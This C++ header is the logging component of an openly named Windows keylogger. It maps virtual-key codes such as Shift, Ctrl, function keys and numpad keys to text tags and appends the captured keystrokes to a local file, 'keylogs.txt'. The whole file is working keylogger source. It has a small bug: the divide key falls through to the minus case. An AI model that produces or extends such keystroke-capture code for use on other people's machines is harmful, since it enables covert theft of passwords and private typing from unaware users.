//
// Created by abant on 13-11-2022.
//

#ifndef KEYLOGGER_SAVEDATA_H
#define KEYLOGGER_SAVEDATA_H

#include<iostream>
#include<windows.h>
#include<stdio.h>
#include<string>
#include<fstream>
using namespace std;

class saveData {

public:
     static void startLogging(string text){
         //creates object for file stream
         ofstream logfile;

         //opens file for writing
        logfile.open("keylogs.txt", ios::app);

         //writes text string to file
        logfile << text;

         //closes stream
        logfile.close();
    }

    static string  KeyIsListed(int Ikey){
        string results;
        switch (Ikey) {
            case VK_SPACE:
                //if space bar is pressed, print space to console
                results = (" "); //write space to logfile
                break;
            case VK_RETURN:
                //same as above, except now 'enter' is counted
                results = ("\n");
                break;
            case VK_SHIFT:
                results = (" [Shift] ");
                break;
            case VK_BACK:
                results = ("\b");
                break;
            case VK_CAPITAL:
                results = "[CAPSLOCK]";
                break;
            case VK_TAB:
                results = "[TAB]";
                break;
            case VK_CONTROL:
                results = "[CTRL]";
                break;
            case VK_MENU:
                results = "[ALT]";
                break;
            case VK_ESCAPE:
                results = "[ESC]";
                break;
            case VK_DECIMAL:
                results = ".";
                break;
            case VK_DIVIDE:
                results = "/";
            case VK_SUBTRACT:
                results = "-";
                break;
            case VK_ADD:
                results = "+";
                break;
            case VK_DELETE:
                results = "[DELETE]";
                break;
            case VK_DOWN:
                results = "[ARROW_DOWN]";
                break;
            case VK_UP:
                results = "[ARROW_UP]";
                break;
            case VK_LEFT:
                results = "[ARROW_LEFT]";
                break;
            case VK_RIGHT:
                results = "[ARROW_RIGHT]";
                break;
            case VK_NUMLOCK:
                results = "[NUM_LOCK]";
                break;
            case VK_NUMPAD0:
                results = "[NUM_PAD_0]";
                break;
            case VK_NUMPAD1:
                results = "[NUM_PAD_1]";
                break;
            case VK_NUMPAD2:
                results = "[NUM_PAD_2]";
                break;
            case VK_NUMPAD3:
                results = "[NUM_PAD_3]";
                break;
            case VK_NUMPAD4:
                results = "[NUM_PAD_4]";
                break;
            case VK_NUMPAD5:
                results = "[NUM_PAD_5]";
                break;
            case VK_NUMPAD6:
                results = "[NUM_PAD_6]";
                break;
            case VK_NUMPAD7:
                results = "[NUM_PAD_7]";
                break;
            case VK_NUMPAD8:
                results = "[NUM_PAD_8]";
                break;
            case VK_NUMPAD9:
                results = "[NUM_PAD_9]";
                break;
            case VK_PRIOR:
                results = "[PAGE_UP]";
                break;
            case VK_NEXT:
                results = "[PAGE_NEXT]";
                break;
            case VK_HOME:
                results = "[HOME]";
                break;
            case VK_END:
                results = "[END]";
                break;
            case VK_F1:
                results = "[F1]";
                break;
            case VK_F2:
                results = "[F2]";
                break;
            case VK_F3:
                results = "[F3]";
                break;
            case VK_F4:
                results = "[F4]";
                break;
            case VK_F5:
                results = "[F5]";
                break;
            case VK_F6:
                results = "[F6]";
                break;
            case VK_F7:
                results = "[F7]";
                break;
            case VK_F8:
                results = "[F8]";
                break;
            case VK_F9:
                results = "[F9]";
                break;
            case VK_F10:
                results = "[F10]";
                break;
            case VK_F11:
                results = "[F11]";
                break;
            case VK_F12:
                results = "[F12]";
                break;
            case VK_SNAPSHOT:
                results = "[PRT_SC]";
                break;
            case VK_BROWSER_SEARCH:
                results = "[SEARCHING...]";
                break;
            default:
                break;
        }
        return results;
    }
};



#endif //KEYLOGGER_SAVEDATA_H
